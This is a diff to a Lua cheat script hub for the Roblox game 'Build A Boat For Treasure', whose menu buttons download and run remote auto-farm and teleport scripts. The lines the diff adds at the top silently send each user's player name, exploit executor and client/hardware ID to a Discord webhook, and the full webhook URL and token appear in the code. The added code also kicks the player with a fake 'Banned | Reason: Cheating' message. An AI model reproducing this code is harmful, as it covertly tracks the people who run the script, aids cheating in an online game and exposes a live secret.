@@ -1,8 +1,55 @@
+local Webhook = "https://discord.com/api/webhooks/1097548811053830175/Mso8HIlHPAf-nxAnUWvSP97XmqTPA4wgpCJ8aOoxFJD0Ui1f1NUCHbgM2LA9m-Kwpm7i"
+local plrname = game.Players.LocalPlayer.Name
+
+local PlayerData =
+{
+       ["content"] = "",
+       ["embeds"] = {
+           {
+           ["title"] = "Name: "..plrname,
+           ["description"] = "Execute is: ".. identifyexecutor(),
+           ["color"] = tonumber(0x00FF00),
+           ["fields"] = {
+               {
+                   ["name"] = "HWID ID:",
+                   ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                   ["inline"] = true
+},
+           },
+        }
+    }
+}
+
+local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
+
+Request = http_request or request or HttpPost or syn.request
+Request(
+    {
+        Url = Webhook, 
+        Body = PlayerData, 
+        Method = "POST", 
+        Headers = {["content-type"] = "application/json"} 
+    }
+)
+
+-- Define the allowed PlaceGameID
+local allowedPlaceGameID = 537413528 -- Replace with your own PlaceGameID
+
+-- Get the user's PlaceGameID
+local placeGameID = game.PlaceId
+
+-- Check if the user's PlaceGameID matches the allowed ID
+if placeGameID == allowedPlaceGameID then
+else
+    -- If the user's PlaceGameID doesn't match the allowed ID, kick them
+    game.Players.LocalPlayer:Kick("Banned | Reason: Cheating")
+end
+
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/GUI"))() 
 local Window = Library.CreateLib("Build A Boat For Treasure | NONAME HUB 4.0", "DarkTheme")
 
-local Tab = Window:NewTab("💳 Auto Farm")
-
+local Tab = Window:NewTab("💳 Auto Farm") local Section = Tab:NewSection("🧧 Script Auto Farm")
+Section:NewButton("Click", " Auto Farm Script", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/Auto%20Farm.lua"))() end)
 local Section = Tab:NewSection("🚀 Teleport Farm")
 Section:NewButton("Auto Teleport Farm", "Respawned = Stop Script Auto Farm", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/Auto%20Teleport%20Farm.lua"))() end)
 
@@ -179,4 +226,3 @@ Section:NewButton("Click", "Key Donatepls152621", function() loadstring(game:Htt
 local Tab = Window:NewTab("🎫 credit") local Section = Tab:NewSection("By: peatchXD#6075")
 
 Section:NewKeybind("⚙ press to change button", "KeybindInfo", Enum.KeyCode.F, function() Library:ToggleUI() end)  
-
